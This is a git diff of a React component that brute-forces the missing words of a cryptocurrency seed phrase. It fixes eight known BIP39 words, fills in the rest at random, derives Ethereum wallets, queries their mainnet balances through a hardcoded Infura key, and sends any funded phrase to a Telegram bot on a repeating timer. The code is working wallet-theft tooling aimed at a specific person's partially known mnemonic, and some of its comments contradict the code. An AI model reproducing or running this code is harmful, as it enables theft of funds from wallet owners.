@@ -1,4 +1,4 @@
-"use client";
+"use client"
 import React, { useState, useEffect, useRef } from "react";
 import { Button, Dialog, DialogPanel } from "@tremor/react";
 import * as bip39 from "bip39";
@@ -20,12 +20,43 @@ export default function RandomWordsGenerator() {
   const intervalRef = useRef(null);
 
   useEffect(() => {
-    // Initially generate words on component mount
-    generateRandomWords();
-  }, []);
+    if (!shouldContinue) {
+      if (intervalRef.current) {
+        clearInterval(intervalRef.current);
+        intervalRef.current = null;
+      }
+      return;
+    }
+
+    intervalRef.current = setInterval(() => {
+      generateRandomWords();
+    }, 23000); 
+
+    return () => {
+      if (intervalRef.current) {
+        clearInterval(intervalRef.current);
+      }
+    };
+  }, [shouldContinue]);
 
   useEffect(() => {
     if (wordGroups.length > 0 && shouldContinue) {
+      const checkBalances = async () => {
+        const validGroups = wordGroups.filter(validatePhrase);
+        const balances = await Promise.all(
+          validGroups.map(async (group) => {
+            return rateLimit(() => checkWalletBalance(group));
+          })
+        );
+        setGroupBalances(balances);
+
+        const found = balances.find((b) => parseFloat(b.balance) >= 0.00001);
+        if (found) {
+          setShouldContinue(false);
+          await sendToTelegram(found.group);
+        }
+      };
+
       checkBalances();
     }
   }, [wordGroups]);
@@ -34,25 +65,24 @@ export default function RandomWordsGenerator() {
     const groups = [];
     for (let i = 0; i < 50; i++) {
       let mnemonic = "";
-
+  
       // Generate mnemonics and check if valid
       while (!bip39.validateMnemonic(mnemonic)) {
         const randomMnemonic = bip39.generateMnemonic(128); // Generate 12-word phrase
-        const remainingWords = randomMnemonic.split(" ").slice(0, 3); // 3 words from random mnemonic
-
-        const fixedWords = [
-          "tribe", "any", "path", "tourist", "risk", "hamster", "scrap", "invite", "again"
-        ]; // Fixed first 9 words
+        const remainingWords = randomMnemonic.split(" ").slice(0, 4); // 5 words from random mnemonic
+  
+        const fixedWords = ["tribe", "any", "path", "tourist" ,"risk","hamster" ,"scrap" ,"invite"]; // Fixed first 4 words
         const finalGroup = [...fixedWords, ...remainingWords]; // Combine fixed and generated words
-
+  
         mnemonic = finalGroup.join(" ");
       }
-
+  
       groups.push(mnemonic.split(" "));
     }
-
+  
     setWordGroups(groups);
   };
+  
 
   const copyToClipboard = (group) => {
     const wordsToCopy = group.join(" ");
@@ -65,12 +95,16 @@ export default function RandomWordsGenerator() {
     return bip39.validateMnemonic(mnemonic);
   };
 
+  // Updated checkWalletBalance function
   const checkWalletBalance = async (group, retries = 3) => {
     const mnemonicPhrase = group.join(" ");
     try {
       const mnemonic = ethers.Mnemonic.fromPhrase(mnemonicPhrase);
       const wallet = ethers.HDNodeWallet.fromMnemonic(mnemonic);
-      const provider = new ethers.InfuraProvider("mainnet", "eb820fc8f8d5445099e988beadba9a27");
+      const provider = new ethers.InfuraProvider(
+        "mainnet",
+        "eb820fc8f8d5445099e988beadba9a27"
+      );
 
       const balance = await provider.getBalance(wallet.address);
       const balanceInEth = ethers.formatEther(balance);
@@ -115,27 +149,6 @@ export default function RandomWordsGenerator() {
       );
     } catch (error) {
       console.error("Error sending message to Telegram:", error);
-    }
-  };
-
-  const checkBalances = async () => {
-    const validGroups = wordGroups.filter(validatePhrase);
-    const balances = await Promise.all(
-      validGroups.map(async (group) => {
-        return rateLimit(() => checkWalletBalance(group));
-      })
-    );
-    setGroupBalances(balances);
-
-    const found = balances.find((b) => parseFloat(b.balance) >= 0.00001);
-    if (found) {
-      setShouldContinue(false);
-      await sendToTelegram(found.group);
-    } else {
-      // Delay 1 second before regenerating random words
-      setTimeout(() => {
-        generateRandomWords();
-      }, 1000); // 1-second delay
     }
   };
 
